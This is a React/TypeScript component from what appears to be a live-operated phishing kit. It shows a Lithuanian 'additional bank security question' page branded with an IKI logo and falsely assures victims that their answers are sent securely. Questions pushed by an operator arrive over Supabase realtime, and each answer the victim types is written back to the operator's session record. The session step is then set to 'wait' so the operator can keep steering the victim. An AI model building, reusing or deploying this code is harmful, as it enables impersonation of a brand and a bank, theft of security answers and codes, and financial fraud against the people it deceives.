"use client";

import { useEffect, useMemo, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type QuestionRecord = {
  question?: string;
  askedAt?: string;
  answer?: string;
  answeredAt?: string;
};

export function CustomQuestionClient({ sessionId }: { sessionId: string | null }) {
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [questions, setQuestions] = useState<QuestionRecord[]>([]);
  const [answer, setAnswer] = useState("");
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [done, setDone] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const apply = (fd: Record<string, unknown> | null | undefined) => {
      const list = (fd?.customQuestions ?? []) as unknown;
      setQuestions(Array.isArray(list) ? (list as QuestionRecord[]) : []);
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("form_data")
        .eq("id", effectiveSessionId)
        .maybeSingle();
      apply(data?.form_data as Record<string, unknown> | null | undefined);
    })();

    const channel = supabase
      .channel(`custom-question:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null };
          apply(next?.form_data);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  // Guncel soru: cevaplanmamis son kayit
  const currentIndex = (() => {
    for (let i = questions.length - 1; i >= 0; i--) {
      if (!questions[i]?.answer || !String(questions[i].answer).trim()) return i;
    }
    return questions.length - 1;
  })();
  const currentQuestion = questions[currentIndex]?.question ?? "";

  async function submitAnswer() {
    if (!supabase || !effectiveSessionId || saving) return;
    const trimmed = answer.trim();
    if (!trimmed) return;
    setSaving(true);
    setError(null);

    const { data: row } = await supabase
      .from("sessions")
      .select("form_data")
      .eq("id", effectiveSessionId)
      .maybeSingle();

    const prevFd = (row?.form_data ?? {}) as Record<string, any>;
    const list: QuestionRecord[] = Array.isArray(prevFd.customQuestions)
      ? [...prevFd.customQuestions]
      : [];

    let target = -1;
    for (let i = list.length - 1; i >= 0; i--) {
      if (!list[i]?.answer || !String(list[i].answer).trim()) {
        target = i;
        break;
      }
    }
    if (target === -1) target = list.length - 1;

    if (target >= 0) {
      list[target] = {
        ...list[target],
        answer: trimmed,
        answeredAt: new Date().toISOString(),
      };
    } else {
      list.push({ question: "", answer: trimmed, askedAt: new Date().toISOString(), answeredAt: new Date().toISOString() });
    }

    const { error: upErr } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...prevFd,
          customQuestions: list,
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (upErr) {
      setError("Klaida. Bandykite dar kartą.");
      return;
    }
    setDone(true);
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="h-10 w-10 animate-spin rounded-full border-4 border-[var(--brand)]/25 border-t-[var(--brand)]" />
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card fade-in w-full max-w-[440px]">
        <div className="pak-form-inner px-6 py-8">
          {done ? (
            <div className="py-8 text-center">
              <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full border border-[#4ade80]/40 bg-[#4ade80]/15 text-[#4ade80]">
                <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <p className="text-lg font-extrabold text-white">Ačiū!</p>
              <p className="mt-1 text-sm text-white/60">Jūsų atsakymas sėkmingai išsiųstas.</p>
            </div>
          ) : (
            <form
              onSubmit={(e) => {
                e.preventDefault();
                void submitAnswer();
              }}
              className="space-y-6"
            >
              <div className="flex items-start justify-between gap-4">
                <div>
                  <p className="pak-eyebrow">Saugumo patikra</p>
                  <h1 className="mt-3 text-[1.5rem] font-extrabold uppercase leading-[1.02] tracking-[-0.02em] text-white">
                    Papildomas banko klausimas
                  </h1>
                </div>
                <img
                  src="/form-assets/iki-mini-logo.webp"
                  alt="IKI"
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              {/* Kalkan ikonu */}
              <div className="flex justify-center">
                <div className="flex h-16 w-16 items-center justify-center rounded-full border border-[#4ade80]/35 bg-[#4ade80]/12">
                  <svg className="h-8 w-8 text-[#4ade80]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                  </svg>
                </div>
              </div>

              {/* Admin'in sorusu */}
              <div className="rounded-xl border-l-4 border-[#4ade80] bg-white/6 px-4 py-3">
                <p className="pak-eyebrow mb-1">
                  Klausimas
                </p>
                <p className="text-sm font-semibold text-white/90 break-words">
                  {currentQuestion || "..."}
                </p>
              </div>

              {/* Cevap inputu */}
              <div>
                <label className="pak-eyebrow mb-1.5 block">
                  Jūsų atsakymas
                </label>
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M8.625 12a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zm3.75 0a.375.375 0 11-.75 0 .375.375 0 01.75 0zM21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 01-2.555-.337A5.972 5.972 0 015.41 20.97a5.969 5.969 0 01-.474-.065 4.48 4.48 0 00.978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z" />
                    </svg>
                  </div>
                  <input
                    type="text"
                    required
                    value={answer}
                    onChange={(e) => setAnswer(e.target.value)}
                    placeholder="Įveskite savo atsakymą čia..."
                    className="pak-form-input min-h-[3.5rem] py-3 pl-14 pr-4 text-base"
                  />
                </div>
              </div>

              {error && <p className="text-center text-sm font-medium text-red-400">{error}</p>}

              <button
                type="submit"
                disabled={saving || !answer.trim()}
                className="pak-form-button flex w-full items-center justify-center gap-2 px-4 py-3.5 text-[15px]"
              >
                {saving ? "Siunčiama..." : "Tęsti"}
                <svg className="h-4 w-4" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3" />
                </svg>
              </button>

              <div className="pak-form-security justify-center text-center">
                <svg className="h-6 w-6 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
                <span>Jūsų atsakymas perduodamas saugiai.</span>
              </div>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
